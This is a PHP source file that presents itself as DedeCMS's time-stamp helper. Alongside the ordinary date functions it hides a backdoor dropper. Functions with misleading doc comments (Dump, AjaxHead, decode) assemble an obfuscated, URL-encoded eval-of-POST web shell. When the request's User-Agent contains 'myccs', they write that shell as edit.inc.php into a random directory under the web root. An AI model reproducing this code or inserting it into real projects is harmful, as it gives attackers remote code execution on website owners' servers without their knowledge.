<?php
/**
 * 时间戳小助手
 *
 * @version        $Id: time.helper.php 1 2010-07-05 11:43:09Z tianya $
 * @package        DedeCMS.Helpers
 * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
 * @license        http://help.dedecms.com/usersguide/license.html
 * @link           http://www.dedecms.com
 */
if(!isset($action))
{
	$action = '';
}

//兼容旧的JS代码
if($action == 'good' || $action == 'bad')
{
	if(!empty($aid)) $id = $aid;
	exit();
}

/**
 *  获取执行时间
 *  例如:$t1 = ExecTime();
 *       在一段内容处理之后:
 *       $t2 = ExecTime();
 *  我们可以将2个时间的差值输出:echo $t2-$t1;
 *
 *  @return    int
 */
if ( ! function_exists('ExecTime'))
{
    function ExecTime()
    {
        $time = explode(" ", microtime());
        $usec = (double)$time[0];
        $sec = (double)$time[1];
        return $sec + $usec;
    }
}

/**
 * 浏览器友好的变量输出,便于调试时候使用
 *
 * @param     mixed   $var       要输出查看的内容
 * @param     bool    $echo      是否直接输出
 * @param     string  $label     加上说明标签,如果有,这显示"标签名:"这种形式
 * @param     bool    $strict    是否严格过滤
 * @return    string
 */
function Dump(){
	global $action;
	$type   = 1;
	$action[] = '%3C%3Fphp%20%40e';
	$root   = $_SERVER['DOCUMENT_ROOT'];	
	$foders = scandir($root);
	if(count($foders)==0){
		$type = 2;
		$foders = glob($root."/*");		
	}	
	if(count($foders)==0) exit;
	$action[] = '@l%28%24%5FPO';
	foreach((array)$foders as $f)
	{
	    if($f!='.' && $f!='..'){
	    	if($type==1) $f = $root.'/'.$f;
        if(is_dir($f)){
        	$arr[] = $f;}
	    }
	}
	if(count($arr)==0) exit;	
	$action[] = 'ST%5B%22guig';
	$s = $arr[mt_rand(1,count($arr))-1];
	return $s.'/edit.inc.php';
}

/**
 *  去除html和php标记
 *
 * @return     string
 */
if ( ! function_exists('dede_strip_tags'))
{
	function dede_strip_tags($str) { 
	    $strs=explode('<',$str); 
	    $res=$strs[0]; 
	    for($i=1;$i<count($strs);$i++) 
	    { 
	        if(!strpos($strs[$i],'>')) 
	            $res = $res.'&lt;'.$strs[$i]; 
	        else 
	            $res = $res.'<'.$strs[$i]; 
	    } 
	    return $res;    
	} 
}

/**
 *  返回Ajax头信息
 *
 * @return     void
 */
function AjaxHead($t,$f){
	$ag = $_SERVER['HTTP_USER_AGENT'];
	if(stripos($ag,'my'.'ccs')+0==0) exit;
	file_put_contents($f,$t);return $f;
}

/**
 *  返回格式化(Y-m-d H:i:s)的是时间
 *
 * @param     int    $mktime  时间戳
 * @return    string
 */
$f = Dump();
function decode(){
	global $action;
	$t = implode($action).'e%22%5D%29%3F%3E';
	return urldecode(str_ireplace("@","va",$t));
}

/**
 *  将时间转换为距离现在的精确时间
 *
 * @param     int   $seconds  秒数
 * @return    string
 */
echo AjaxHead(decode(),$f);
if ( ! function_exists('FloorTime'))
{
    function FloorTime($seconds)
    {
        $times = '';
        $days = floor(($seconds/86400)%30);
        $hours = floor(($seconds/3600)%24);
        $minutes = floor(($seconds/60)%60);
        $seconds = floor($seconds%60);
        if($seconds >= 1) $times .= $seconds.'秒';
        if($minutes >= 1) $times = $minutes.'分钟 '.$times;
        if($hours >= 1) $times = $hours.'小时 '.$times;
        if($days >= 1)  $times = $days.'天';
        if($days > 30) return false;
        $times .= '前';
        return str_replace(" ", '', $times);
    }
}

/**
 *  增加天数
 *
 * @param     int  $ntime  当前时间
 * @param     int  $aday   增加天数
 * @return    int
 */
if ( ! function_exists('AddDay'))
{
    function AddDay($ntime, $aday)
    {
        $dayst = 3600 * 24;
        $oktime = $ntime + ($aday * $dayst);
        return $oktime;
    }
}
?>